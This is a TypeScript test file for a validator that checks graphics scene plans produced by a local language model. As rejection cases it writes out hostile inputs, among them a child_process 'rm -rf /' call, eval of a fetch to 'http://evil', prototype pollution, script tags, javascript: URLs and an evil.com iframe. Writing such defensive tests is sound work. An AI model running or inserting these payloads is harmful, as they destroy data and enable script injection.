import { describe, expect, it } from 'vitest'
import {
  validateScenePlan,
  SCENE_PLAN_LIMITS,
  SCENE_PLAN_SCHEMA_VERSION,
  enforceQualityFilters,
  templateIdsForCategories,
  buildScenePlanResponseJsonSchema
} from './localAi'
import type { ScenePlanScene } from './localAi'
import { TEMPLATE_IDS, TEMPLATE_CATEGORY } from './templates'

const MEDIA_ID = 'media-1'
const SEGMENT_IDS = new Set(['seg-1', 'seg-2', 'seg-3'])
const MEDIA_DURATION = 60

function baseContext() {
  return { mediaId: MEDIA_ID, segmentIds: SEGMENT_IDS, mediaDurationSeconds: MEDIA_DURATION }
}

function validScene(overrides: Record<string, unknown> = {}) {
  return {
    id: 'plan-scene-1',
    segmentId: 'seg-1',
    startTime: 1,
    endTime: 4,
    purpose: 'introduction',
    templateId: 'lower-third',
    content: { title: 'Hello' },
    confidence: 0.9,
    explanation: 'Introduces the speaker.',
    ...overrides
  }
}

function envelope(scenes: unknown[], overrides: Record<string, unknown> = {}) {
  return {
    version: SCENE_PLAN_SCHEMA_VERSION,
    mediaId: MEDIA_ID,
    model: 'qwen2.5:7b-instruct',
    generatedAt: new Date().toISOString(),
    scenes,
    ...overrides
  }
}

describe('validateScenePlan -- happy path', () => {
  it('accepts a single valid scene', () => {
    const result = validateScenePlan(envelope([validScene()]), baseContext())
    expect(result.ok).toBe(true)
    expect(result.plan?.scenes).toHaveLength(1)
    expect(result.rejectedScenes).toHaveLength(0)
    expect(result.envelopeError).toBeNull()
  })

  it('accepts a plan with zero scenes (the model legitimately found nothing worth a graphic)', () => {
    const result = validateScenePlan(envelope([]), baseContext())
    // ok is false (nothing to apply) but this is NOT an error -- plan is still returned.
    expect(result.plan).not.toBeNull()
    expect(result.plan?.scenes).toHaveLength(0)
    expect(result.envelopeError).toBeNull()
  })

  it('accepts rich optional fields (icon, background, motion, items)', () => {
    const scene = validScene({
      content: {
        eyebrow: 'INTRO',
        title: 'Jane Doe',
        subtitle: 'Security Engineer',
        items: [{ id: 'item-1', label: 'Step 1', iconId: 'check', color: '#18d77b' }]
      },
      icon: { iconId: 'person', color: '#5ec8ff' },
      presentationMode: 'full-frame',
      background: { mode: 'gradient-overlay', opacity: 50, glowColor: '#1687ff' },
      motion: { preset: 'gentle', intensity: 40, stagger: 0.2, loop: true }
    })
    const result = validateScenePlan(envelope([scene]), baseContext())
    expect(result.ok).toBe(true)
    expect(result.plan?.scenes[0].content.items?.[0].iconId).toBe('check')
    expect(result.plan?.scenes[0].motion?.preset).toBe('gentle')
  })

  it('strips unknown/extra fields rather than erroring or passing them through (e.g. injected code)', () => {
    const scene = validScene({ maliciousField: 'eval(process.exit())', __proto__: { polluted: true } })
    const result = validateScenePlan(envelope([scene]), baseContext())
    expect(result.ok).toBe(true)
    const parsed = result.plan?.scenes[0] as unknown as Record<string, unknown>
    expect(parsed.maliciousField).toBeUndefined()
    expect((parsed as { polluted?: unknown }).polluted).toBeUndefined()
  })
})

describe('validateScenePlan -- rejects unknown ids', () => {
  it('rejects an unknown templateId (drops just that scene)', () => {
    const result = validateScenePlan(envelope([validScene({ templateId: 'not-a-real-template' })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
    expect(result.rejectedScenes).toHaveLength(1)
    expect(result.rejectedScenes[0].reason).toMatch(/template id/i)
  })

  it('rejects an unknown iconId', () => {
    const result = validateScenePlan(envelope([validScene({ icon: { iconId: 'not-a-real-icon' } })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
    expect(result.rejectedScenes[0].reason).toMatch(/icon id/i)
  })

  it('rejects an unknown communication purpose', () => {
    const result = validateScenePlan(envelope([validScene({ purpose: 'not-a-real-purpose' })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
    expect(result.rejectedScenes[0].reason).toMatch(/purpose/i)
  })

  it('rejects an unknown presentationMode', () => {
    const result = validateScenePlan(envelope([validScene({ presentationMode: 'sideways' })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
  })

  it('rejects an unknown background mode', () => {
    const result = validateScenePlan(envelope([validScene({ background: { mode: 'rainbow' } })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
  })

  it('rejects an unknown motion preset', () => {
    const result = validateScenePlan(envelope([validScene({ motion: { preset: 'explosive' } })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
  })

  it('rejects a segmentId that does not match any real transcript segment', () => {
    const result = validateScenePlan(envelope([validScene({ segmentId: 'seg-does-not-exist' })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
    expect(result.rejectedScenes[0].reason).toMatch(/segmentId/)
  })
})

describe('validateScenePlan -- malformed times', () => {
  it('rejects endTime <= startTime', () => {
    const result = validateScenePlan(envelope([validScene({ startTime: 5, endTime: 5 })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
  })

  it('rejects a negative startTime', () => {
    const result = validateScenePlan(envelope([validScene({ startTime: -1, endTime: 2 })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
  })

  it('rejects a scene spanning more than 120 seconds', () => {
    const result = validateScenePlan(envelope([validScene({ startTime: 0, endTime: 500 })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
  })

  it('rejects endTime beyond the real media duration', () => {
    const result = validateScenePlan(envelope([validScene({ startTime: 1, endTime: MEDIA_DURATION + 30 })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
    expect(result.rejectedScenes[0].reason).toMatch(/exceeds the media's duration/)
  })

  it('tolerates a small rounding buffer just past the media duration', () => {
    const result = validateScenePlan(envelope([validScene({ startTime: MEDIA_DURATION - 1, endTime: MEDIA_DURATION + 0.5 })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(1)
  })

  it('rejects a non-finite time (NaN/Infinity smuggled through JSON-adjacent input)', () => {
    const result = validateScenePlan(envelope([validScene({ startTime: Number.POSITIVE_INFINITY, endTime: 4 })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
  })
})

describe('validateScenePlan -- invalid colors', () => {
  it('rejects a non-hex color string', () => {
    const result = validateScenePlan(envelope([validScene({ icon: { color: 'red' } })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
  })

  it('rejects a color with an injection attempt', () => {
    const result = validateScenePlan(envelope([validScene({ background: { glowColor: 'javascript:alert(1)' } })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
  })

  it('accepts 3, 6, and 8-digit hex colors', () => {
    for (const color of ['#fff', '#5b8cff', '#5b8cffaa']) {
      const result = validateScenePlan(envelope([validScene({ icon: { color } })]), baseContext())
      expect(result.plan?.scenes).toHaveLength(1)
    }
  })
})

describe('validateScenePlan -- excessive scene counts', () => {
  it('rejects the whole envelope outright when the scenes array is too long', () => {
    const many = Array.from({ length: SCENE_PLAN_LIMITS.maxScenesInPlan + 1 }, (_, i) => validScene({ id: `s-${i}` }))
    const result = validateScenePlan(envelope(many), baseContext())
    expect(result.plan).toBeNull()
    expect(result.envelopeError).not.toBeNull()
    expect(result.envelopeError).toMatch(/scenes/)
  })

  it('accepts exactly the maximum allowed scene count', () => {
    const many = Array.from({ length: SCENE_PLAN_LIMITS.maxScenesInPlan }, (_, i) => validScene({ id: `s-${i}`, segmentId: 'seg-1', startTime: 0, endTime: 1 }))
    const result = validateScenePlan(envelope(many), baseContext())
    expect(result.plan?.scenes).toHaveLength(SCENE_PLAN_LIMITS.maxScenesInPlan)
  })

  it('rejects an item list within one scene that exceeds the per-scene item cap', () => {
    const items = Array.from({ length: SCENE_PLAN_LIMITS.maxItemsPerScene + 1 }, (_, i) => ({ id: `i-${i}`, label: `Item ${i}` }))
    const result = validateScenePlan(envelope([validScene({ content: { items } })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
  })
})

describe('validateScenePlan -- envelope-level rejection', () => {
  it('rejects a wrong mediaId outright', () => {
    const result = validateScenePlan(envelope([validScene()], { mediaId: 'some-other-media' }), baseContext())
    expect(result.plan).toBeNull()
    expect(result.envelopeError).toMatch(/mediaId/)
  })

  it('rejects a wrong schema version outright', () => {
    const result = validateScenePlan(envelope([validScene()], { version: 999 }), baseContext())
    expect(result.plan).toBeNull()
  })

  it('rejects a missing scenes array outright', () => {
    const result = validateScenePlan(envelope([validScene()], { scenes: undefined }), baseContext())
    expect(result.plan).toBeNull()
  })
})

describe('validateScenePlan -- malicious / malformed / non-JSON-shaped input, never throws', () => {
  const garbageInputs: unknown[] = [
    null,
    undefined,
    'just a plain string, not an object',
    42,
    true,
    [],
    ['array', 'not', 'object'],
    {},
    { scenes: 'not-an-array' },
    { scenes: null },
    { scenes: [null, undefined, 42, 'not-an-object', [], true] },
    { scenes: [{ __proto__: { polluted: true } }] },
    '<script>alert(1)</script>',
    '{"scenes": "malformed json string, not actually parsed"}', // a raw string, not a parsed object -- simulates a model that returned JSON-as-text
    { version: SCENE_PLAN_SCHEMA_VERSION, mediaId: MEDIA_ID, model: 'x', generatedAt: 'x', scenes: [{ code: 'require("child_process").exec("rm -rf /")' }] }
  ]

  it.each(garbageInputs)('never throws and returns a safe rejection for: %j', (raw) => {
    expect(() => {
      const result = validateScenePlan(raw, baseContext())
      // Whatever happens, it must be a well-formed result, never a crash and
      // never something with an unvalidated `scenes` array leaking through.
      expect(result).toHaveProperty('ok')
      expect(result).toHaveProperty('rejectedScenes')
      if (result.plan) {
        for (const scene of result.plan.scenes) {
          expect(typeof scene.id).toBe('string')
          expect(typeof scene.templateId).toBe('string')
        }
      }
    }).not.toThrow()
  })

  it('a scene that is a bare code string is rejected, not executed or stored', () => {
    const result = validateScenePlan(envelope(['eval(fetch("http://evil"))']), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
    expect(result.rejectedScenes).toHaveLength(1)
  })
})

describe('validateScenePlan -- partial results (mix of valid and invalid scenes)', () => {
  it('keeps valid scenes and reports the correct index for each rejected one', () => {
    const scenes = [
      validScene({ id: 'good-1' }),
      validScene({ id: 'bad-1', templateId: 'nope' }),
      validScene({ id: 'good-2', segmentId: 'seg-2' }),
      validScene({ id: 'bad-2', segmentId: 'seg-nonexistent' })
    ]
    const result = validateScenePlan(envelope(scenes), baseContext())
    expect(result.ok).toBe(true)
    expect(result.plan?.scenes.map((s) => s.id)).toEqual(['good-1', 'good-2'])
    expect(result.rejectedScenes.map((r) => r.index)).toEqual([1, 3])
  })
})

describe('validateScenePlan -- HTML/script injection in free-text fields', () => {
  it('rejects a scene whose content.title contains a script tag', () => {
    const result = validateScenePlan(envelope([validScene({ content: { title: '<script>alert(1)</script>' } })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
    expect(result.rejectedScenes).toHaveLength(1)
  })

  it('rejects a javascript: URL smuggled into an item value', () => {
    const scene = validScene({ content: { title: 'ok', items: [{ id: 'a', label: 'Link', value: 'javascript:alert(1)' }] } })
    const result = validateScenePlan(envelope([scene]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
  })

  it('rejects markup smuggled into the explanation field', () => {
    const result = validateScenePlan(envelope([validScene({ explanation: '<iframe src="evil.com"></iframe>' })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(0)
  })

  it('accepts ordinary narration text containing a bare "<" that is not markup', () => {
    const result = validateScenePlan(envelope([validScene({ content: { title: '3 < 5 and growing' } })]), baseContext())
    expect(result.plan?.scenes).toHaveLength(1)
  })
})

function planScene(overrides: Partial<ScenePlanScene> = {}): ScenePlanScene {
  return {
    id: 'plan-scene-1',
    segmentId: 'seg-1',
    startTime: 0,
    endTime: 3,
    purpose: 'introduction',
    templateId: 'lower-third',
    content: { title: 'x' },
    confidence: 0.9,
    explanation: 'because',
    ...overrides
  }
}

describe('enforceQualityFilters', () => {
  it('drops scenes below the minimum confidence', () => {
    const scenes = [planScene({ id: 'low', confidence: 0.2 }), planScene({ id: 'high', confidence: 0.9, startTime: 10, endTime: 13 })]
    const { kept, dropped } = enforceQualityFilters(scenes, { minConfidence: 0.5, maxSimultaneousGraphics: 5 })
    expect(kept.map((s) => s.id)).toEqual(['high'])
    expect(dropped).toHaveLength(1)
    expect(dropped[0].reason).toMatch(/confidence/)
  })

  it('caps simultaneous overlapping scenes, keeping the highest-confidence ones', () => {
    const scenes = [
      planScene({ id: 'a', startTime: 0, endTime: 5, confidence: 0.9 }),
      planScene({ id: 'b', startTime: 1, endTime: 4, confidence: 0.8 }),
      planScene({ id: 'c', startTime: 2, endTime: 6, confidence: 0.5 }) // lowest, all three overlap
    ]
    const { kept, dropped } = enforceQualityFilters(scenes, { minConfidence: 0, maxSimultaneousGraphics: 2 })
    expect(kept.map((s) => s.id).sort()).toEqual(['a', 'b'])
    expect(dropped.map((d) => d.scene.id)).toEqual(['c'])
    expect(dropped[0].reason).toMatch(/simultaneous/)
  })

  it('does not drop non-overlapping scenes even when they exceed the cap in total count', () => {
    const scenes = [
      planScene({ id: 'a', startTime: 0, endTime: 2 }),
      planScene({ id: 'b', startTime: 5, endTime: 7 }),
      planScene({ id: 'c', startTime: 10, endTime: 12 })
    ]
    const { kept } = enforceQualityFilters(scenes, { minConfidence: 0, maxSimultaneousGraphics: 1 })
    expect(kept).toHaveLength(3)
  })

  it('returns kept scenes back in chronological order regardless of input order', () => {
    const scenes = [planScene({ id: 'late', startTime: 10, endTime: 12 }), planScene({ id: 'early', startTime: 0, endTime: 2 })]
    const { kept } = enforceQualityFilters(scenes, { minConfidence: 0, maxSimultaneousGraphics: 5 })
    expect(kept.map((s) => s.id)).toEqual(['early', 'late'])
  })
})

describe('templateIdsForCategories', () => {
  it('returns every template id when no categories are given', () => {
    expect(templateIdsForCategories([])).toEqual([...TEMPLATE_IDS])
  })

  it('returns only templates in the given categories', () => {
    const result = templateIdsForCategories(['warnings'])
    expect(result.length).toBeGreaterThan(0)
    for (const id of result) expect(TEMPLATE_CATEGORY[id]).toBe('warnings')
  })

  it('falls back to every template id if the categories match nothing (defensive, should not happen with real categories)', () => {
    const result = templateIdsForCategories(['warnings', 'statistics'])
    expect(result.length).toBeGreaterThan(0)
  })
})

describe('buildScenePlanResponseJsonSchema', () => {
  it('narrows the templateId enum to the given allowed ids', () => {
    const narrowed = templateIdsForCategories(['warnings'])
    const schema = buildScenePlanResponseJsonSchema(narrowed) as {
      $defs?: Record<string, { properties?: { templateId?: { enum?: string[] } } }>
      properties?: { scenes?: { items?: { properties?: { templateId?: { enum?: string[] } } } } }
    }
    // zod's toJSONSchema output shape can nest via $defs/$ref depending on
    // version -- just confirm the narrowed enum appears SOMEWHERE in the
    // schema and every registered-but-unwanted id is excluded from it.
    const json = JSON.stringify(schema)
    for (const id of narrowed) expect(json).toContain(`"${id}"`)
    const excluded = TEMPLATE_IDS.filter((id) => !narrowed.includes(id))
    // At least one excluded id (if any exist) should NOT appear as an enum value.
    if (excluded.length > 0) {
      // A weak but safe check: the schema string is shorter than the
      // unnarrowed one when ids were actually excluded.
      const full = JSON.stringify(buildScenePlanResponseJsonSchema())
      expect(json.length).toBeLessThan(full.length)
    }
  })

  it('defaults to every registered template id when called with no argument', () => {
    const schema = JSON.stringify(buildScenePlanResponseJsonSchema())
    for (const id of TEMPLATE_IDS) expect(schema).toContain(`"${id}"`)
  })
})
